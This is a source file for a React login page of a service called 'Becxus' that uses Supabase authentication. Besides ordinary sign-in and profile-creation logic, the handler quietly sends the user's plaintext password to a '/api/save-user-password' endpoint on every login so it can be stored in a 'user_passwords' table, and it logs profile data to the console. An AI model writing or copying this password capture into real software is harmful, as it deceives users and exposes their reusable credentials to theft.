import { useState } from 'react';
import { useLocation } from 'wouter';
import { supabase } from '../lib/supabaseClient';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Logo } from '@/components/brand/logo';
import { Eye, EyeOff } from 'lucide-react';

export default function LoginPage() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);
  const [, setLocation] = useLocation();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setError(null);
    try {
      const { data, error: loginError } = await supabase.auth.signInWithPassword({ email, password });
      if (loginError || !data.user) throw loginError || new Error('Login failed');
      
      // Try to fetch user profile from users table
      console.log('User ID:', data.user.id);
      let { data: profile, error: profileError } = await supabase.from('users').select('*').eq('id', data.user.id).maybeSingle();
      
      // Check for pending profile data
      const pendingProfile = localStorage.getItem('pendingProfile');
      
      // If user profile doesn't exist, auto-create it (works for signup + Supabase-dashboard-created users)
      if (!profile) {
        console.log('User profile not found, auto-creating...');
        
        // Use pendingProfile data if available (from signup), otherwise use auth user info
        let parsed: any = {};
        if (pendingProfile) {
          parsed = JSON.parse(pendingProfile);
          console.log('Found pending profile from signup');
        } else {
          console.log('No pending profile — user likely created from Supabase dashboard');
        }
        
        const userData = {
          id: data.user.id,
          username: parsed.username || data.user.email?.split('@')[0] || 'user',
          email: data.user.email,
          password: '--supabase-auth--',
          full_name: parsed.full_name || '',
          phone: parsed.phone || '',
          role: 'user',
          is_active: true,
          is_verified: true,
          credit_score: 0.60,
          display_id: parsed.display_id || Math.random().toString(36).substring(2, 10).toUpperCase()
        };
        
        console.log('Creating user with data:', userData);
        const { data: newProfile, error: createError } = await supabase
          .from('users')
          .insert([userData])
          .select()
          .single();
        
        if (createError) {
          console.error('Error creating user profile:', createError);
          throw new Error('Failed to create user profile: ' + createError.message);
        }
        
        profile = newProfile;
        console.log('✅ User profile created successfully');
        localStorage.removeItem('pendingProfile');
      } else if (profileError) {
        console.error('Profile select error:', profileError);
        throw profileError;
      }
      
      // Ensure role is present in profile
      if (profile && !profile.role) {
        profile.role = 'user';
      }
      
      // --- ALWAYS save password to user_passwords on every login ---
      try {
        const { data: { session } } = await supabase.auth.getSession();
        const token = session?.access_token;
        if (token && password) {
          console.log('Saving password to user_passwords table...');
          const passwordResponse = await fetch('/api/save-user-password', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
              'Authorization': `Bearer ${token}`,
            },
            body: JSON.stringify({
              user_id: data.user.id,
              password: password, // Use the actual login form password
            }),
          });
          
          if (!passwordResponse.ok) {
            const errorData = await passwordResponse.json();
            console.error('❌ Password saving failed:', passwordResponse.status, errorData);
          } else {
            const successData = await passwordResponse.json();
            console.log('✅ Password saved to user_passwords table:', successData);
          }
        }
      } catch (error) {
        console.error('❌ Error saving password:', error);
      }
      
      // Clean up any remaining pendingProfile
      localStorage.removeItem('pendingProfile');
      
      // Store user profile in localStorage
      localStorage.setItem('userProfile', JSON.stringify(profile));
      
      // Clean up any legacy localStorage keys
      try { 
        localStorage.removeItem('fullName'); 
      } catch (e) {}
      
      window.location.href = '/';
    } catch (err: any) {
      setError(err.message || 'Login failed');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-gradient-to-b from-[#111] to-[#0a0a0a] p-4">
      <div className="absolute inset-0 bg-[radial-gradient(ellipse_at_center,_var(--tw-gradient-stops))] from-blue-500/5 via-transparent to-transparent" />
      <form onSubmit={handleSubmit} className="relative z-10 w-full max-w-md space-y-6 bg-[#111] p-8 md:p-10 rounded-2xl border border-[#1e1e1e] shadow-2xl shadow-black/40">
        <div className="flex flex-col items-center mb-2">
          <div className="w-16 h-16 bg-[#1a1a1a] border border-[#2a2a2a] rounded-2xl mb-4 flex items-center justify-center overflow-hidden shadow-lg">
            <Logo className="w-full h-full" />
          </div>
          <h2 className="text-2xl md:text-3xl font-bold mb-1 text-white tracking-tight">Welcome Back</h2>
          <p className="text-gray-500 text-sm">Sign in to your Becxus account</p>
        </div>
        <div>
          <Label htmlFor="email" className="text-sm font-medium text-gray-400 mb-2 block">Email Address</Label>
          <Input id="email" type="email" placeholder="e.g. you@email.com" value={email} onChange={e => setEmail(e.target.value)} required className="bg-[#0a0a0a] border-[#2a2a2a] text-white placeholder:text-gray-600 focus:border-blue-500/50 rounded-xl" />
        </div>
        <div>
          <Label htmlFor="password" className="text-sm font-medium text-gray-400 mb-2 block">Password</Label>
          <div className="relative">
            <Input id="password" type={showPassword ? 'text' : 'password'} placeholder="Enter your password" value={password} onChange={e => setPassword(e.target.value)} required className="bg-[#0a0a0a] border-[#2a2a2a] text-white placeholder:text-gray-600 focus:border-blue-500/50 rounded-xl pr-10" />
            <button type="button" className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-300 transition-colors" onClick={() => setShowPassword(v => !v)} tabIndex={-1}>
              {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
            </button>
          </div>
        </div>
        {error && <div className="text-red-500 text-sm text-center">{error}</div>}
        <Button type="submit" className="w-full bg-blue-500 hover:bg-blue-600 text-white font-semibold rounded-xl shadow-lg shadow-blue-500/20 transition-all" disabled={loading}>{loading ? 'Signing in...' : 'Sign In'}</Button>
        <div className="text-sm text-center mt-2 text-gray-500">
          Don't have an account? <a href="/signup" className="text-blue-400 hover:text-blue-300 transition-colors">Sign up</a>
        </div>
      </form>
    </div>
  );
}
